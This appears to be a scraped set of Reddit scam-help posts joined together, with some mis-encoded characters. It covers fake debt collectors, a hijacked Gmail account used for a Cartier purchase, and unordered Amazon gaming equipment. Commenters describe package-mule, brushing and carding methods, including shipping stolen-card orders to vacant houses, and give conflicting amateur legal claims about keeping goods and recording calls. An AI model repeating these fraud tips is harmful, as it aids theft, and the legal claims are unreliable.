If you are positive the debt you're being accused of has never existed or has already been resolved, this is a scam. Keep in mind that companies can change names and debts can be sold, so not recognizing the company you owe isn't necessarily proof of a scam; you should call the company where the debt originated to confirm a debt exists. Be mindful of debt collection laws in your state or country before engaging in any conversation with a debt collection agency, to avoid being liable for debts that may be outside their statute of limitations for collections.

Like legitimate debt collectors, scam collectors may have access to your SSN, address, names of your contacts, etc. from a data breach. They may be calling your family, friends and employer relentlessly with invasive or embarrassing questions about you. They may send you threatening letters, emails and texts that state you will be sued or arrested if you don't immediately pay them X amount of dollars. These are scare tactics to rush you into paying before you have a chance to consider the situation logically. Instruct all of your contacts that this is fraud and to block the calls. If the scammers know a lot about you, you have potentially been involved in a serious data breach.

Here's a guide from r/identityTheft that covers the basics of credit freeze, IRS pins, even replacement SSN and police reports: https://www.reddit.com/r/IdentityTheft/comments/pqb1za/identity_theft_recovery_101/

You need to freeze your credit through the credit bureaus: https://www.reddit.com/r/IdentityTheft/comments/uvv3ij/psa_freezing_your_three_main_credit_reports_is/ and freeze your debit line with Chex Systems https://www.chexsystems.com/security-freeze/place-freeze

edit: i've checked gmail's details - & the only IP address I see is my own.  checked google security manager and i recognize all sessions.

  
UPDATE:  shortly after making this post, I checked my filters to see someone had added "CARTIER" & "CHASE".  I checked my chase credit card to see that through Paypal they had charged $2k at Cartier. 

I suspect, they are doing this through my google account which was linked to my paypal.  

what I dont get. 

* changed my password last night w. 2FA (phone verification & backup codes) 
* no devices but mine are logged in (per google account)
* no ip address but mine is showing up in recent activity (per gmail details)

**
- You could well have an infostealer or keylogger on your computer.

Frankly I would nuke my computer and iDevices - and start from scratch again.
- assuming you're using unique and secure passwords, have you run a malware scan on your computer?
- Make your passwords unique and random and go to your account settings and see if there's a way to log out of all active sessions.
- Even if you recognize all sessions, log out of all of them. then log in and make a new password, and log out of all again. Do you live alone? If they charged $2k to your paypal, you can get the invoice from paypal and see what email and address they are using to see if you can identify who it may be.
- Let's back up a bit, why do you think you're getting hacked? Just the email filters? If so, that's not usually something we see, often they will change the password or do something a little more destructive than set some email filters. Are there actual illegitimate orders as well from these companies, or just some email filters set?

Want to make sure we're staring with all the information here
- can i save my files down to an external hard drive beforehand?  or would I risk trackign the malware wiht them?
- no how do i do that?
- i live alone.  i have their address, but they used my gmail. I suspect my gmail is compromised as they had email filters set for the store they purchased from so I wouldn't see it.  i just don't get how they're getting in.
- pls see my latest update.... ;(
- To give you an idea of the possibility - when ransomware attackers encrypt a computer, they also encrypt attached storage devices.

That aside, I would look at it this way.  You are trying to remediate an issue which could well involve something like a keylogger or infostealer on a device.  If you back up your data to an external hard drive, and after placing those files back on a clean system, the infostealer or keylogger comes with it - you are probably no worse off than you are now?

You could do malware scans on your computer before taking the step of nuking it, like with free Malwarebytes - and maybe it would detect the malware.  There's never a 100% guarantee it would find everything.  I don't know if Malwarebytes or your anti-virus can scan an external hard drive device.  Many can.  So that's worth a shot before reinstalling if you go the nuke route.

Your problem seems to be a serious one because something is causing persistence.
- and would i have to do it on my phone and ipad too?
- Like I said, you need to do a hard log out of google and gmail that logs you out of everything. Then from a different device reset the password and then log out everything all over again. They have access to your gmail and your google account which is why changing the password doesn't work. Your other option is to make a new gmail and change all of your accounts to the new gmail. But it seems like it's a keylogger or someone who knows you.
- The update doesn't help a ton, because there's clearly something odd going on here. I wonder if you might have given another app permissions to access your email? That would explain why it can only hide emails and it doesn't just change your password to keep you out.
- yeah tell me about it. i feel like pulling out my hair.¬†¬†


so i can download malwarebytes and run a scan on my computer?¬†


could it be on my android or ipad too?
- phone and ipad - no unless you've gone out of your way to install apps from outside the app store. you'd know if you've done this.

For your computer, you can use the free version of malwarebytes (don't click on sponsored results, scammers like to buy ads)
- how do I do a hard log out?  I've gone to my google account and forced sign out of each device.  is that not it?
- right? i thought that was odd too. but how? ive forced sign outs multiple times. sonce the first hacking back in 2023.¬† deleted all saved passwords and delinked all 3rd party apps.
- yes that's what I meant. But also do the malware scan because with 2 step, they shouldn't really be able to guess unless you generate the backup codes too and they can see them which means they may have a key tracker on your computer
- what do you recommend for a malware scna?

Title: I received $1800 worth of gaming equipment from Amazon but I didn‚Äôt order it!
Body: Yesterday, I received a package from Amazon that was addressed to me. It had a gaming mouse, keyboard and headset that I didn‚Äôt order. I was expecting 2 small things on Friday but they definitely were not the things I got lol. I contacted Amazon and explained the situation and after 20 minutes of them investigating, they said to keep it! 

Today, I received a huge box from Amazon and as soon as I opened it, I was shocked! It was a Samsung OLED gaming monitor worth $1800 and I know I didn‚Äôt order it! I contacted Amazon and the woman I spoke to immediately put me on hold. After explaining everything that‚Äôs happened over the past 2 days, she said I could keep the monitor as well. 

I do enter a bunch of giveaways so I thought it could‚Äôve been from one of those but that seems very unlikely. The total amount is on the pricier side and I wasn‚Äôt notified and I wasn‚Äôt asked to fill out any paperwork either. All my information is safe and haven‚Äôt had anything suspicious activity so I‚Äôm a bit confused. Im not complaining about free products, just curious about where these items came from. Could this be some sort of scam? 

Edit:  When I received the first round of items, there was an Amazon slip that had a few of the items and a price, I kinda knew what I was supposed to be getting. I‚Äôm beginning to think I‚Äôve won some sort of giveaway because I received a gaming chair today as well. I think this was the last of the shipment but this has been a wild ride so far! Will I ever know where these came from, who knows?

- Amazon mistake.
Keep a copy of the message from Amazon to Keep it.
Hold on to it for a week or so, then enjoy.
- Could also be a variation of the package mule scam.Stuff bought with a stolen cc, shipped to your address, and then someone contacts you saying packages were shipped to you by mistake and can you send them or can they have someone come pick them up. That way the trail ends with you.
- This has been happening A LOT!  
I've been driving for Amazon for the last few months, and there have been customers trying to hand things back to me saying "this person doesn't live here" or "this is the correct address, but I didn't order anything"

I tell them the same thing. Check your account (bank and amazon) for any charges. I was told to bring it here, so it's yours, FREE.

I get in more trouble if I bring it back.
- Legally if it was addressed to you and delivered it is yours.  It is the law because long time ago people would delivered items and then send an invoice forcing people to pay.
- Probably someone vaguely acquainted to you, or in your neighborhood/apartment complex that ordered the equipment with a stolen credit card and shipped it to you, with hopes of intercepting the package. Did you pick up the package immediately when it was delivered? Are you usually around for deliveries? Do things sometimes sit around on your porch? Definitely keep the chat logs with Amazon. There will probably be a fraud investigation from someone, somewhere, at some point.
- Have you ever talked about wanting a gaming computer within your social circles? Did a secret crush send it to you?
- Dang wish stuff like this would happen to me haha
- Check your credit cards/amazon account for any unauthorised purchases. 

Since you're living in an area without any porch pirates it might be that someone will come knocking and asking for his items.
- Amazon delivered a brand new ipad to my house with my name on it. I didn't buy it, wasn't billed for it. I contacted Amazon to return it but they said they had no record of it so they couldn't take it back.  It was hot pink but I still used it at work for a few years.
- Edit: Oh yeah, that is mine, I clicked an old reddit secret Santa address by mistake
- Jesus, I‚Äôve seen what you‚Äôve done for others‚Ä¶
- Why do I not get anything like this? What happens to me is either package is lost or replaced with junk and I need to deal with that shit instead.
- Have you looked on your Amazon account? And in your archived orders?
- Oddly enough when computer stuff or electronics gets mis-shipped nobody ever wants it back. I ordered a monitor and got 2.  Then another day I got a printer. It stayed in the box in my closet for almost a year before I was brave enough to open it.
- This happened to me not long ago. Got 2 cheap monitors in the mail we didn't order. We asked Amazon if we could return them and they said we couldn't since there was no order for it so just keep it. It was just a shipping error that they somehow have no procedure in place to fix when it happens. Thanks Bezos I guess?
- Wow, that‚Äôs wild! If Amazon told you to keep everything, it sounds like you lucked out üéâ. Just to be safe, I‚Äôd hang on to any proof of what they said in case there‚Äôs confusion later. 

Also, keep an eye on your accounts‚Äîyou can never be too careful with surprises like this!
- When you win the lottery, you don't try to send the check back.¬†



If a cute girl falls in love with you, you don't try to convince her she made a mistake.



If you get switched to first class, you don't say "no no! I only paid for economy!"
- Never happens to me I just get bills.
- I lost my job two weeks ago, why cant something like this happen to me? But seriously, Congratulations!
- i do crazy shit in my sleep too man
- Do not scan any QR Code you may find in the box.
- Over this last Christmas, I received a package that had two labels on it, one was mine, and the other was for the actual intended buyer.  I did let Amazon know and they didn‚Äôt offer much help so I took the package to the post office and said it was prepaid to go to this other individual and had them send it to them.
- Make darn sure you have written messages telling you to keep all these items
- > I do enter a bunch of giveaways

I think that's what it is.  I've entered contests too, sometimes they make a big deal when you win with forms and such, sometimes the prizes just randomly show up.  Could also be a winner couldn't claim the prize and so it went to an alternate, which usually happens without much fanfare.
- So, now you are waiting for the gaming PC? /s
- Man I never get that lucky with Amazon mistakes. I only got a small lego set as a mistake. üòÇ
- Just make sure u don‚Äôt scan ANYTHING
- My daughter had ordered something simple from Amazon. They sent a Roomba (?) for her floors instead. When she called Amazon, they told her to keep it.
- The only thing i‚Äôve ever received from an amazon mistake was a giant box of cheap toilet paper
- Have you tested this equipment to see if it works?  Also, was the packaging sealed, like one usually expects?  Was it a familiar brand, or a knockoff?

In any case, I see 4 possibilities here:  

* \#1--  It's a **[brushing scam](https://www.uspis.gov/news/scam-article/brushing-scam).**  Brushing scams are generally a way for sellers to get around "verified purchase" checks and any volume of sales measures (i.e., *this e-store sold a hundred things. no way its a scam!*).  
Typically, in a brushing scam, you would get tons of shipments of some useless crap (someone once got, or continues to get, an unending supply of head lamps).  
  * Counterpoint:  Those usually don't involve expensive brand name products (assuming as such).  



* \#2-- 
**Problematic thievery:** is that someone in a warehouse tried to steal something, but screwed up or panicked.  They just dumped it somewhere convenient because they'll just try again later.  
  * This assumes that your financial accounts are not involved.  No stolen credit card numbers or bank account transfers.


* \#3-- 
**Not a scam; just some weird error.**  Do you happen to have a generic sounding name or address?  Maybe you had some recent expected shipments or returns?  If it wasn't sent to you by name, then it was obviously some sort of typo.  
Otherwise, this would be a shipping error, and thus likely the responsibility of the shipping company or contracted workers.  You'd have to contact them to investigate this.  

However, trying to coordinate between the seller, amazon, shipper, and who knows what else, will most likely not go anywhere.  It could also take a long time, potentially cost you money, or result in another error.  In legal terms, your effort to seek and return the product is notable.  If amazon says to keep it, then it is yours.  If no one takes it after you ask them to, then it is yours.

Ultimately, whatever you do will be unlikely to help the original/intended recipient, unless you have their contact info.

* \#4--  **Drop off point for hot items.**  If someone steals a credit card to buy stuff, sending that stuff directly to themselves would be all the necessary evidence to get arrested.  If what you got was, instead, something illegal (like drugs), then this would obviously be the actual scenario.
- I ordered Samsung OLED gaming monitor and I received 2 tampons.
- I don't understand why people's first instinct is to try to give this stuff back? Like,  it was addressed to you, you didn't have to pay for it,  it's yours. Life fucks us hard,  often,  and with no lube. Take the little W's when they come
- In your Amazon account, have you looked under ‚Äúarchived orders‚Äù?
- Enjoy your new toys!
- Wait until you see what's coming tomorrow! üòâ
- if its adressed to you you're definitely good. contact amazon and report it but you're alright to keep it. i ordered a screen protector for a steam deck and got it + an iphone 12 screen  protector and apple watch. they never responded to me telling them about the mistake but it said i could keep the stuff i received in the report system.
- I once received a 1/2 size upright bass. It was valued at around $l1800, and yes, they came back and picked it up a week later.
- It's a sign. You need to build a PC now!
- Do a chat re this issue and say you want confirmation of what you were told verbally. Take a pix of any labels on the box.
- Honestly I need to enter whatever you did to get the same result I really want pc stuff to play and stream sadly I has none
- Does something like that not come with an invoice from the seller?
- This sub is getting really weird with questions like this.
- Hmmm....I'm gonna start sending stuff to my sister and have her send stuff to me and we will call Amazon and say we didn't order it.
- Post it in pcmasterrace subreddit
- Nice!
- Twice in 10 years of fairly constant Amazon deliveries have I gotten stuff I didn't order. Both times told to keep it. Once I ordered a $10 item and received a completely different about $10 item, but the other time I ordered a 30 lb. bag of kitty litter, about $20 and received a replacement headlight assembly for a motorcycle, about $150. Sold it on Ebay when Amazon didnt want it back. Also, both times Amazon DID send me the correct items when I contacted them.
- The other day I was looking at a particular vitamin on Amazon but I didn‚Äôt order it and a few days later it showed upü§∑‚Äç‚ôÄÔ∏è
- This happened to my roommate, she ordered a pair of headphones or something small, and it got lost for long enough that they refunded her. A week later, a 55 inch Fire TV arrived on the porch. The shipping label to the lost headphones were was on there, partially covering a shipping label for an address six states away. Amazon told her to keep it as well.
- If you don‚Äôt need/want it sell it
- Any anniversary, birthday or special occasion coming? You might have someone sending you those as surprise gifts.
- A reverse scam. Lol.
- This happened to me once with Walmart and it turns out someone had stolen one of my credit cards and placed a bunch of orders for crap that delivered to my door.   Check all of your cards.
- Sick!

Lucky you ü§ô
- Occasionally I get stuff from Amazon addressed to me that I didn't order. They're never there when I check my purchases on Amazon so there's no simple way to process a return so I've been keeping them or giving them away. They've been relatively inexpensive items (less than $50). The last one was two hair dryers. I assume there's some glitch in Amazon system causing this. If I were you I'd keep it unused for a couple of months and if they don't ask for it back then consider it yours.

- Nothing cool like this ever happens to me!
- I‚Äôve had Amazon tell me ‚Äòkeep it‚Äôs when I was going to return something but not $1900.
- I once got an expensive pair of sneakers a half size too big. Couldn‚Äôt return them because they ‚Äúhadn‚Äôt been ordered.‚Äù I still wear them.
- Wow. Amazon has had me send  them back a $20 item that was addressed to me and delivered to me.  I can't imagine them letting go this stuff.
- That's awesome. And as others have probably said, don't give it to anyone else, claiming to be the actual buyer, or (fake) amazon returns, or (fake) police coming to confiscate, or something.
- I ordered a roll of solder last week and got that plus a triple laptop monitor and carry case. Amazon just screws up sometimes. Also, in a lot of states you are legally entitled to keep items that are delivered to you by mistake.

- Send it to me and I'll straighten it out
- Be careful.  Some vendors send product to 3rd parties only to gain the opportunity to write favorable reviews on Amazon.com.  The cost is simply a marketing expenditure.  They want their review to say "verified purchaser" -- and they are!
- This is done by sellers so they can put in a fake positive review under your name.  See if Amazon can trace the tracking info backwards. It would be helpful to check that nobody has set up a new account using your name. This happened to me on eBay.
- It's probably a brushing scam.  Someone orders stuff in your name and then submits a review to a site that will only accept "verified purchaser" reviews.  It used to only be low end items....hmmm.  My worry would be that they might come after the items, burglary style.  But even high end stuff needs five star reviews.  If it is a brushing scam, Amazon is paid. They won't care except that they are being pressured to delete brushing reviews.  They probably just opened a second e-mail address in your name, paid with a third party card, and will (or already have) posted a glowing review under your name.

I guess professional reviewers get flagged for posting too many good reviews.
- Bro I could use a new mouse and keep ill jagg u off
- Return to sender...
- hey! i can take a closer look at it and tell if you are getting scammed, just send it over my way!
- Return it ASAP before the people who stole a CC and ordered it to your address come looking for it
- I wish I would‚Äôve done that but I was on the phone with them instead of using the chat feature
- Don‚Äôt need to keep anything or record any calls. It‚Äôs an FTC protection. The items don‚Äôt have to be returned or paid for.
- Keep the message for 5 years
- UMMM. NOT A SCAM‚Äî‚Äî-   I think that Maybe you have applied for a work from home position at AMAZON and they are sending you the necessary equipment needed to perform the job effectively and efficiently??????    THATS my guess because ive worked from home for many MANY companies over the last 10 years  and every company i worked for sent the necessary equipment to my home prior to the start date.  To ensure i had every tool needed to be successful in the role i was hired for.
- This‚Ä¶or they were expecting to intercept the packages/swipe em from the porch before OP noticed the delivery since they weren‚Äôt aware they were coming!

A few years ago something similar happened to me where I kept getting expensive electronics shipped to me/addressed to me, eventually I figured it out and it was a co-worker that lived nearby was buying things with stolen credit cards and having them sent to me so that I would get blamed eventually. I went to the police and he quit his job and disappeared and I returned everything. Police never arrested him.
- Hmmm maybe this is why I randomly got 2 cans of garbanzo beans one day.
- The other day my neighbor knocked on my door cause he had my amazon package.¬† I just brought ours in and saw one of my boxes had his address on it so we swapped em.¬† I know it's a different thing but man it would suck if you had something expensive and a shitty neighbor.
- Can you deliver stuff to my home as well lol
- But they may want to remain in good standing with overlord amazon
- i totally saw a short the other day that said exactly what that is called , it was a guy who while unconscious was airlifted twice by the same helicopter company and charged about 40k per flight, but he never said he wanted to go on the helicopters and can't be expected to pay. it's called ... um  ..'officious intermeddling' (took ai a while but we got there!)
- I live for n a very rural area in a house and there is always someone at home. Most of ours neighbors are friends and the few that aren‚Äôt are in their 80s. I was home when both deliveries showed up. We‚Äôve had packages sitting out before for hours, sometimes days and we‚Äôve never had an issue.
- I don‚Äôt really post much on social media but I‚Äôm not a gamer so I haven‚Äôt said anything about wanting these items. It‚Äôs so confusing lol
- My thought exactly
- If they were addressed to OP originally, it wouldnt matter what that person would say, they would need to prove who they are and what they purchased
- Yeah, I‚Äôve checked everything and there‚Äôs no record on my end of these purchases. Amazon went through my purchase history as well and there is nothing even close to what I received! We both are stumped ü§î
- Well shit. I think I may have fucked up. Three times! Susie, if you are reading this I ALMOST WON THE LOTTERY! 
(Also, spirt airlines, I sat in coach cause your first class is somehow worse).
- Good on you! You're obviously a good person,  because sadly, not everyone would've been so honest!
- Unlikely imo most giveaways usually need to confirm that the winner exists by responding with their address and info confirming they are over 18 most of the time but there‚Äôs still a chanceü§∑‚Äç‚ôÇÔ∏è
- Another aspect of the brushing scam is including a QR code to see who sent you this present. The QR code downloads malicious content on your device
- Everything was in its original boxes and the monitor is a Samsung odyssey and the other items are nice brands as well.  I don‚Äôt have a common name or address so it‚Äôs definitely a mystery! I did contact Amazon again today but in the chat so I could have it that way too but they said to keep everything ü§∑üèª‚Äç‚ôÄÔ∏è
- It‚Äôs called honesty and integrity. Give the company a chance before keeping it.
- I checked there too and there‚Äôs nothing out of the ordinary
- Brushing scams tend not to send genuine product like OP is describing as this gets exceptionally expensive when the ultimate aim is lots of good reviews. Also don‚Äôt think samsung needs to resort to brushing scams to get good reviews lol.
- They won‚Äôt take the items back and said to do whatever I wanted with them. I‚Äôm still going to hold onto them for a few weeks to see if anything comes up
- Call them back, tell them you are recording the call, and have them confirm that you can keep the equipment. Buy a small voice recorder if you need to.
- I'm pretty sure if someone mails you something it's legally yours. This is to stop people from mailing things oit and then claiming the recipient must pay for it.
- You can still use the chat feature for confirmation. Or, if a month passed and no one contacts you about property, it‚Äôs considered abandoned (according to the people‚Äôs court. Look into this)
- Amazon‚Äôs records all calls with customers, standard practice.OP is fine
- Call them back and have them send you an email confirming you can keep it. I have done this before when something similar happened.
- You might be able to back to Chat with Us and screenshot the messages.  I don‚Äôt think they delete the convo.
- I agree that this is possible, but it seems odd to me that they would address a package purchased with stolen funds to a real resident at whatever address. When I read a little bit of a carding guide they recommended shipping to vacant houses listed for sale and the like.
- Bean mule!
- Not a lawyer, but I believe that there is a difference if it is misdelivered vs misaddressed. If it has your name but your neighbors address and it goes to them, then they can keep it. If it has your name and address but goes to them, they are not entitled to it. They don't have an obligation to bring it to you, but if you go to them and say "this package was given to you in error", they can't say finders keepers.
- a few years ago a delivery of mine got swapped with someone that lived several blocks away. I ordered something for like $25 and she had ordered a Kindle. Amazon told me to keep it, and they shipped out replacements for both of us!
- Long story, Fedex accidentally switched labels on a box of mine with a box that contained a 7k men's watch.  They were very careful on their wording when dealing with me because of the law.  I researched it including talking to the local police.
- Oh no, I have to open a new account, dang.
- And it must be true since it was on the internet...
- Well, the plot thickens indeed.
- I didn‚Äôt say anything about social media. I said social circles.
- I mean that is the scam.

Someone will come knocking and asking for his items because he didn't get them before the OP.
- Amazon can tie the waybill to the order that generated it and where and how it originated, they're just not telling you what happened.  It's possible the CSR you spoke with didn't have necessary permissions to see that in the system, but whoever they escalated to would.  

If they're telling you to keep it, then it's nothing that's gonna tie back to you and you should be clear.
- Were the packages delivered outside, front of your house or in a package room/residence?
- Sound like a "brushing" scheme

This scam is called brushing, and it has recently been popping up nationwide. Suddenly, boxes of unordered (by the recipient) merchandise from Amazon or other online sellers begin arriving. There is no return address, or sometimes it just appears to come from Amazon or another retailer, and the receiver has yet to learn who ordered the items. The items are varied. For example, in one case, a humidifier, a hand warmer, a flashlight, a Bluetooth speaker, and a computer vacuum cleaner arrived unordered. Often, the items received are lightweight and inexpensive to ship, such as ping pong balls, face masks, or seeds from China.



Why would such merchandise be sent to you if you didn‚Äôt request it? The companies, usually foreign, third-party sellers that are sending the items are simply using your address that they discovered online. They intend to make it appear that you wrote a glowing online review of their merchandise and that you are a verified buyer of that merchandise. They then post a fake, positive review to improve their products‚Äô ratings, which means more sales. The payoff is highly profitable from their perspective.
- Yeah everytime I have won something I have to prepay the shipping and taxes first.
- Yeah.  Congrats then.  
This could be a story to tell at some point.  I guess it will be the internet legend of ...   u/lilpickle06 ...  so lil' pickle it is!  >.> ...
- Was it on your orders list?
- They did,  Amazon said they were good. This isn't like some mom and pop electronics store. This same thing could happen 100x and it wouldn't even be a line item for Amazon
- It is not legal for Amazon to force OP to do anything with the package like pay for it or send it back. It belongs to OP now.

https://consumer.ftc.gov/articles/what-do-if-youre-billed-things-you-never-got-or-you-get-unordered-products#unordered
- Why? A company can't send you something you dident ask for then make you pay for it. Op is in the clear
- Amazon will hang up if you tell them you are recording.
- I believe it will not hold up legally unless u tell them u are recording the conversation. I'm not a lawyer but some time ago that was the law it might of changed in the meantime because that was about 20yrs ago
- Just for future reference many chat apps have to option to save a transcript of the chat, I wonder if this would work as proof?
- I did start a chat earlier and got them to  verify that I could keep the items without any further issues

https://preview.redd.it/rkqy2viyvnee1.jpeg?width=1284&format=pjpg&auto=webp&s=ad8b8a3e72260c4b99e6ea8b0bb8308ba11e15ec
- Lol they just said they were talking to them on the phone, no?
- It‚Äôs not odd. Many companies review orders or employ 3rd party fraud detection companies to confirm orders are shipping to valid addresses. Shipping to an address which doesn‚Äôt link to the name on the order is a red flag and many companies will not do it anymore.

There are a few ways in which this is not a perfect process and some fraud orders still slip through but I won‚Äôt go into detail since scammers often hide in this sub. 

Something I CAN say would be that if a charge is made using stolen credit card info to a valid address and it is later reported as fraud, the merchant will likely put the address used on some kind of deny list for future orders and depending on the fraud deter software or company they use, they may be able to share that bad order history with other merchants which may cause other merchants not to ship to their address in the future.
- My point is, they can totally keep it but amazon may choose to blacklist them or something due to the loss so getting their recognition of the situation may ease that.
- Did you end up keeping the watch or returning it?
- And maybe use a different name and/or different address and/or different payment method under a new name? And possibly lose access to digital goods and services purchased in the past? 

Depending on how invested one  is in the amazon ecosystem, this could be really annoying.
- They didn't claim that. Sometimes there's enough information and the resources are reliable enough that one can reasonably infer that it's valid. Only fools dismiss things out of hand and attack strawmen.
- Right, it‚Äôs definitely a mystery!
- My bad, either way, I have very few people‚Äôs in my circle and I‚Äôm not a gamer and would have no use for these items
- They were delivered to my house and left on my porch.
- Why would anyone spend $1800 to order something for a fake review though...  That's not lightweight or inexpensive.
- No, the last things I ordered from Amazon were slippers and a tshirt and they‚Äôre not coming until Friday üòÇ
- FYI - The reason for this is to prevent scams where companies would send people stuff they didn't order, then demand payment for it.
- Excellent link. Thanks!
- This is different in the UK https://www.bbc.co.uk/news/business-37048351 for anyone on this side of the pond
- NAL. My understanding is that they can't make you pay for it, that would be illegal, but in some jurisdictions they can demand that you return it.
- Are you OP‚Äôs lawyer? Are you a lawyer?
- But they can make him return it.
- Receiving stolen merchandise is still s crime
- You really don‚Äôt have to tell you‚Äôre recording if they play that ‚Äúthis call is being recorded for quality and training purposes‚Äù message, because there is no justifiable expectation of not being recorded on their end. Once you hear that on a call, go ahead and record. In fact, make sure you get that in the recording you make. 

Oh, and even if that message isn‚Äôt played (extremely rare), if you‚Äôre talking to someone in a call center in India, the Philippines, etc. (not a U.S. state or territory), it‚Äôs extremely unlikely that you would face any liability. Particularly if you ask the person you speak with where they are.
- Maybe. Maybe not.
- Not for me
- It is on a state by state basis, and the most burdensome state law applies, so if you are in a one-party approval state and you call a both party approval state, then you need to make sure both parties to the call consent to the recording.   

No reason not to tell them no matter what. If they decline to be recorded, you know something is fishy with the order.
- I believe now there is a way to record messages on iPhone and it automatically tells the other person ‚ÄúThis call will now be recorded‚Äù. Freaked some friends out with it
- You could always take a screenshot. With web browsers like Firefox you can also take long screenshots of multiple pages worth at once. Both screenshots and textual transcripts can easily be tampered with though.
- Grats on the surprise gift man.
- just screenshot the phone call bro
- Somebody has been sending stuff to my house for like 2 years‚Ä¶ they use my last name and some random first name every time.  I used to leave them outside, but it got annoying after a while so I just accept the free stuff now.  They‚Äôve even started taping vaguely threatening letters to my door

https://i.imgur.com/vXeG7oX.jpeg
- Fedex sent us both labels to exchange packages.  I sent it to the watch dealer in hollywood after they had mailed my product back to me.
- It‚Äôs likely not someone who knows you that did it. 

Someone most likely used a stolen card somewhere to make the purchase and just selected an address in their area that they thought they could pick the items up from  before the real person got them. 

There are so many places that a name and address is listed publicly. The person committing the fraud selects a random address that has a public record of who owns it or lives there and tries to get the items before the real person does. They will often be right behind the delivery person. 

Because they don‚Äôt actually know the person at the address, they don‚Äôt know your schedule or that yours home all the time and immediately get the packages that arrive at your house. They‚Äôre just hopeful to have picked an easy address. And if they didn‚Äôt, oh well, they used a stole credit card so no money out of their pocket, they just try again with another address.
- I'm prepared to take on the burden of providing a forever home to this poor misplaced equipment for you.
- Maybe resell or give to someone who would have a use for them? Also if this is a amazon mistake i really hope it happens to me someday lol. Especially as I'll be building my first pc this month, praying i dint end up with the opposite issue and have to deal with stuff i bought not arriving
- Child? Grandchild? Family member?
- Sometimes scammers order expensive items using stolen credit cards and use random addresses with easy access for delivery. They keep track of the orders and usually pick them up before the house owner notices the delivery. You were faster than them apparently... It happens when people work from home....
- Get a doorbell camera pronto
- OP, everyone saying that you won‚Äôt see any consequences of this since your account and card weren‚Äôt used is giving you incorrect info. 

If the charges connected with the shipments ever get reported as fraud, they could mark your address as a ‚Äòdo not ship‚Äô address in the future and this could mean ANY account trying to ship to your address would be also marked as ‚Äòdo not ship‚Äô. 

So while no one can force you to pay for or return the merch, you could see real fallout later. If you suddenly start having trouble getting orders that you have placed, this is why.
- No, no one can force you to go to the trouble and expense of returning unsolicited items.

- I don't know OP's jurisdiction, but [here's South Dakota's statutory provision](https://sdlegislature.gov/Statutes/37-24-2) on the subject.

- Are you a troll?
- Nope, the burden would be on them to try to collect it. They could send a pre paid package for you to return it to them, but if you dident follow through with there request they would have to sue to get it back witch would cost them more then it's worth so would never happen.
- Er, no it isn't. And nothing was stolen here.
- Nothing was stolen. There is no crime. Or I could send you a brick and make you pay me or charge you for theft if you don't pay to return it.
- There's also typically a faint intermittent beep in the background on customer service calls - this serves as an indication the call is being recorded in case someone forgets to disclose that.

edit: I don't know why this is being downvoted, it's true: https://www.arnoldporter.com/en/perspectives/blogs/enforcement-edge/2021/04/say-yes-to-the-beep

"The court's opinion tees up interesting factual questions about what constitutes consent to be recorded. The court suggested that in some situations, consent may be implied, such as when sending faxes or text messages (which are by definition recorded). Also, in remanding the Smith case to the Court of Appeals, the California Supreme Court left open the possibility that an audible 'beep' or perhaps a visible 'Recording' icon could provide notice that a communication was being recorded and that, by continuing a communication, other parties implicitly consented to being recorded."
- I think it‚Äôs more company policy than law. They don‚Äôt want their interactions recorded and released. I worked at Amazon for a few years, but things may have changed since then‚Äîbut at the time they would say something like ‚Äúwe don‚Äôt answer calls on a recorded line, if you would like to call back on an unrecorded line, we would be happy to take your call‚Äù or something similar. But, again, things may have changed since I worked there.
- Well, here‚Äôs the thing. They tell you the call is being recorded, so there is no need for their consent to your recording. 

Because they have gone ahead and done the compliance to cover their own asses, it happens to also cover yours. 

There is no justifiable expectation that the call is not being recorded if there is a message saying ‚Äúthis call is being recorded for quality and training purposes,‚Äù you just get a copy of your own if you also record it for yourself.
- Not necessarily, when I worked in a call center for a major bank we were instructed to transfer to a team leader on an unrecorded line if a caller said they were recording. The TL would tell them they couldn't continue the call if they kept recording and if they refused we'd hang up on them. Company-wide policy, regardless of what the call was about.
- Even if the Amazon representative is located in a two-party consent state, consent by a party is only required when that party has a reasonable expectation of privacy. It would be difficult to establish such an expectation for a customer service representative. Even without a "this call is being recorded" message, the most reasonable belief is that the call is not private.
- That is not how I have understood it. If I call someone from my one-party state (NC), I can record my call. I don't know where the other party is and I don't care -- it's my call.
- > the most burdensome state law applies

Not exactly. [It's more complicated than that](https://www.mwl-law.com/wp-content/uploads/2018/02/RECORDING-CONVERSATIONS-CHART.pdf). Even so, your take is a safe bet to avoid complicated interstate law interactions.
- Maybe a video or screen recording (iPhone) with his phone even?
- I read the letter. It does sound vaguely threatening of them stealing your packages.  Sometimes humans disgust me.
- "Official" looking but doesn't specify who the writer is.  Did others on your street get the same?
- Please tell me you have invested in some security cameras and guns for protection.
- That's what I would have done.
- Sad thing is it's not just an "oh well" moment to thieves these days. They feel entitled to what they purchased with stolen funds, so they will get mad and make it an issue if they can.
- Yeah that's usually my problem!
- No, none of my family or friends could afford this stuff tbh lol and I don‚Äôt have kids so I‚Äôm not sure how this happened!
- We have them all over our property so if someone shows up, we‚Äôll know! I‚Äôm being extra vigilant for the next few weeks just in case
- lol.  First photo....delivery person leaves package.  Second, photo...thief wearing a hoodie, medical mask and sunglasses takes package.
- Thank you
- Interesting. I read a thread about someone who ordered a game on Kickstarter and the company accidentally sent two copies to some backers while others didn't receive anything. The company asked backers who received two copies to send the extra one back and one of the backers was arguing that this was illegal. Some in the discussion said that keeping the extra game could be unjust enrichment.
- Excellent and definitive link. Thank you!
- You do realize you just agreed with me, right. You don't have to pay to return it but you have so send it back. And yes suing someone is how civil law is enforced. Whether they choose to do so or not is a separate issue
- That is a very interesting insight.
- Sounds like something a shady bank would do
- ‚ÄúThe Law is an Ass‚Äù. :)
- I understand it differently, but I am not a lawyer. If it matters to you, I think you could look into it a bit more as to what the laws actually are.  

BTW, one of my FAVORITE two party recording stories comes from back when Fox News‚Äô Bill O‚ÄôReilly was making creepy phone calls to Andrea Mackris. This was his famous ‚Äúfalafel‚Äù problem. When her lawyers brought suit, they never said that Mackris recorded Bill-O‚Äôs calls without his permission (NY is a two-party state). They just included long passages of creepy dialogue from the abusive calls. The suit was settled with a secret agreement, but Mackris was somehow able to buy a very nice condo soon after.
- Wow. Great link! Thanks!
- Exactly‚Ä¶ like ‚ÄúI haven‚Äôt stolen your packages yet, but I will if you don‚Äôt let me use your porch as my own personal PO box‚Äù

Also acting like it‚Äôs simply an accident is rich when he‚Äôs used my last name every time with several different first names
